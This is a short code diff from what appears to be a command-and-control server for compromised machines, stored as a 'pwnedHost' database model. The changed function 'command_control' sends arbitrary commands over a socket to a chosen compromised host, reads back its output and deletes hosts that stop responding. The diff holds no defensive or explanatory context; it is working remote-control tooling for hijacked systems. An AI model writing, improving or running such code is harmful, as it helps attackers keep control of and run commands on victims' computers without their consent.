@@ -3,6 +3,7 @@ import sys
 import time
 import threading
 from command_control.models import pwnedHost
+from multiprocessing import Process
 
 
 def create_socket(user, interface, port):
@@ -35,9 +36,12 @@ def sock_connect():
         print(" Failed to Connect..!! " + str(error_message))
 
 
-def command_control(command, ip_address):
-    host = pwnedHost.objects.get(ip=ip_address)
-    connect.sendto(command.encode(),(host.ip,host.port))
+def command_control(command, id, ip_address):
+    host = pwnedHost.objects.get(id=id, ip=ip_address)
+    try:
+        connect.sendto(command.encode(),(host.ip,host.port))
+    except:
+        host.delete()
     result = connect.recv(16384)
     return result
 
